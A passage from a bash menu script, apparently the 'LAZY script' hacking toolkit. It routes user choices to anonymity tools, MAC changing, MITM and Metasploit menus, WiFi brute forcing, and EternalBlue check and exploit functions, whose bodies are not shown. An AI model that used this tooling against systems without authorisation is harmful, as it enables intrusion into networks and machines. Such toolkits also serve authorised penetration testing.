			echo -e "Done."
		fi
	elif [ "$YORNAA" = "6" ]
	then
		if [ ! -f "/usr/bin/anonsurf" ]
		then
			echo -e "Anonsurf is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
		else
			echo -e "Status of anonsurf..."
			anonsurf status
			echo -e "Done."
		fi
	elif [ "$YORNAA" = "d6" ]
	then
		if [ ! -f "/usr/bin/anonsurf" ]
		then
			echo -e "Anonsurf is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
		else
			echo -e "Restarting anonsurf..."
			anonsurf change
			echo -e "Done."
		fi
	elif [ "$YORNAA" = "r6" ]
	then
		if [ ! -f "/usr/bin/anonsurf" ]
		then
			echo -e "Anonsurf is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
		else
			echo -e "Restarting anonsurf..."
			anonym8 change
			echo -e "Done."
		fi
	elif [ "$YORNAA" = "7" ]
	then
		public_ip
	elif [ "$YORNAA" = "8" ]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [ "$YORNAA" = "10" ] || [ "$YORNAA" = "11" ] || [ "$YORNAA" = "12" ]
	then
		new_terminal
	elif [ "$YORNAA" = "13" ]
	then
		mitm_menu
	elif [ "$YORNAA" = "14" ]
	then
		metasploit_menu
	elif [ "$YORNAA" = "exit" ]
	then
		exit
	elif [ "$YORNAA" = "update" ]
	then
		printf '\033]2;UPDATE\a'
		clear
		update_lscript
	elif [ "$YORNAA" = "if" ]
	then
		ifconfig
	elif [ "$YORNAA" = "changelog" ]
	then
		clear
		cat "$LPATH"/Changelog
		echo -e "$PAKTC"
		$READAK
		clear
	elif [ "$YORNAA" = "" ]
	then
		clear
		exec bash "$0"
	elif [ "$YORNAA" = "errors" ]
	then
		errors_menu
	elif [ "$YORNAA" = "etercheck" ]
	then
		eternalblue_check
	elif [ "$YORNAA" = "eternalblue" ]
	then
		eternalblue
	elif [ "$YORNAA" = "wififb" ]
	then
		wififb
	elif [ "$YORNAA" = "start" ]
	then		
		start_menu
#----------
	elif [ "$YORNAA" = "stop" ]
	then
		stop_menu
	elif [ "$YORNAA" = "exit" ]
	then
		clear
		exit
	fi
####check if it is ks
var1=1
check_if_ks
####
}

####################################
defaults_l
printf '\033]2;The LAZY script\a'
if [ "$ONETIMEPERLAUNCH" != "1" ]
then
	one_time_per_launch_ks
fi
####################################
if [ -f ""$LPATH"/IAGREE.txt" ]
then

	if [ ! -f ""$LPATH"/wlan.txt" ]
	then
		set_interface_number
	fi
	clear
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	WLANN=$(cat "$LPATH"/wlan.txt)
	export WLANNM
	export WLANN
	managed_spaces
	monitor_spaces
	banner
	main_options
	if [ "$BACKL" = "1" ]
	then
		exec bash "$0"
		
	else
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi
else
	terms_of_use
fi
